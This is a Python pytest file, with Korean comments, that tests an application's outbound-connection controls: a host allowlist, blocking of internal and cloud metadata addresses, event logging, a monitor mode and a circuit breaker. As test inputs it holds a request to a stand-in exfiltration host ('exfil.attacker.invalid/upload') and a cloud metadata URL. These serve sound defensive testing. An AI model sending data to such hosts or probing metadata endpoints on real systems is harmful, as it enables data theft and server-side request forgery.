"""나가는 연결 통제 — 허용 목록·내부 주소 차단·서킷 브레이커(app/security/egress.py)."""
import pathlib
import re

import pytest
import requests
from requests.adapters import BaseAdapter

from app import db
from app.config import settings
from app.security import egress

ROOT = pathlib.Path(__file__).resolve().parents[1]


@pytest.fixture(autouse=True)
def _fresh_breakers():
    egress.reset()
    yield
    egress.reset()


def test_every_external_host_in_code_is_allowlisted():
    hosts = set()
    for p in (ROOT / "app").rglob("*.py"):
        for h in re.findall(r"(?<![a-z])(?:https?|wss?)://([a-zA-Z0-9.\-]+)", p.read_text(encoding="utf-8")):
            hosts.add(h.lower())
    hosts -= {"127.0.0.1", "localhost", "example.com", "www.example.com"}
    hosts -= {"js.tosspayments.com"}                    # 브라우저가 불러오는 결제창 스크립트(CSP) — 서버가 나가는 연결 아님
    hosts -= {"www.w3.org"}                             # SVG 이름공간 식별자(xmlns — 수준진단 레이더 그림) — 연결 아님
    missing = sorted(h for h in hosts if h not in egress.ALLOWED and not h.endswith((".example", ".invalid")))
    assert missing == []


def test_unlisted_host_is_blocked_before_any_network_io():
    with pytest.raises(egress.EgressDenied):
        requests.get("https://exfil.attacker.invalid/upload", timeout=1)
    ev = db.query("SELECT kind, detail FROM security_event WHERE kind='egress_blocked'")
    assert ev and "exfil.attacker.invalid" in ev[0]["detail"] and "/upload" not in ev[0]["detail"]   # 경로·쿼리는 남기지 않음


def test_first_block_right_after_boot_is_recorded(monkeypatch):
    """monotonic 은 부팅 뒤 초 — '기록한 적 없음'을 0 으로 두면 켜진 지 5분 안의 차단이 통째로 빠진다(결함 19)."""
    monkeypatch.setattr(egress, "_now", lambda: 12.0)                     # 부팅 12초 뒤(systemd 가 앱을 막 띄운 때)
    for _ in range(3):                                                    # 같은 호스트 5분 안 반복은 한 번만
        with pytest.raises(egress.EgressDenied):
            egress.check_host("early.attacker.invalid")
    rows = db.query("SELECT detail FROM security_event WHERE kind='egress_blocked'")
    assert len(rows) == 1 and "early.attacker.invalid" in rows[0]["detail"]
    monkeypatch.setattr(egress, "_now", lambda: 12.0 + 301)              # 5분이 지나면 다시 기록
    with pytest.raises(egress.EgressDenied):
        egress.check_host("early.attacker.invalid")
    assert len(db.query("SELECT 1 FROM security_event WHERE kind='egress_blocked'")) == 2


def test_configured_webhook_cannot_point_to_internal_addresses(monkeypatch):
    monkeypatch.setattr(settings, "ALERT_WEBHOOK_URL", "http://169.254.169.254/latest/meta-data")   # 클라우드 메타데이터
    with pytest.raises(egress.EgressDenied, match="internal_address"):
        egress.check_url(settings.ALERT_WEBHOOK_URL)
    monkeypatch.setattr(settings, "ALERT_WEBHOOK_URL", "http://127.0.0.1:8080/hook")
    with pytest.raises(egress.EgressDenied):
        egress.check_url(settings.ALERT_WEBHOOK_URL)
    monkeypatch.setattr(settings, "EGRESS_EXTRA_HOSTS", "127.0.0.1")       # 운영자가 명시하면 허용
    egress.check_url("http://127.0.0.1:8080/hook")


def test_monitor_mode_records_without_blocking(monkeypatch):
    monkeypatch.setattr(settings, "EGRESS_MODE", "monitor")
    with pytest.raises(requests.exceptions.ConnectionError) as ei:          # 검사는 통과, 이름 확인에서 실패
        requests.get("https://new-source.invalid/data", timeout=1)
    assert not isinstance(ei.value, egress.EgressDenied)
    assert db.query("SELECT 1 FROM security_event WHERE kind='egress_unlisted'")


class _Down(BaseAdapter):
    def __init__(self):
        super().__init__()
        self.calls = 0

    def send(self, request, **kw):
        self.calls += 1
        r = requests.Response()
        r.status_code, r.url, r.request = 503, request.url, request
        return r

    def close(self):
        pass


def test_circuit_breaker_fails_fast_then_recovers():
    s = requests.Session()
    down = _Down()
    s.mount("https://finnhub.io", down)
    for _ in range(egress.Breaker.FAILS):
        assert s.get("https://finnhub.io/api/v1/quote").status_code == 503
    with pytest.raises(egress.CircuitOpen):
        s.get("https://finnhub.io/api/v1/quote")                           # 원천을 더 두드리지 않고 즉시 실패
    assert down.calls == egress.Breaker.FAILS
    b = egress.breaker("finnhub.io")
    b.opened_at -= egress.Breaker.COOLDOWN + 1                             # 냉각 시간 경과
    ok = _Down()
    ok.send = lambda request, **kw: (setattr(r := requests.Response(), "status_code", 200), r)[1]
    s.mount("https://finnhub.io", ok)
    assert s.get("https://finnhub.io/api/v1/quote").status_code == 200     # 시험 호출 성공 → 닫힘
    assert b.state == "closed" and egress.status()[0]["state"] == "closed"
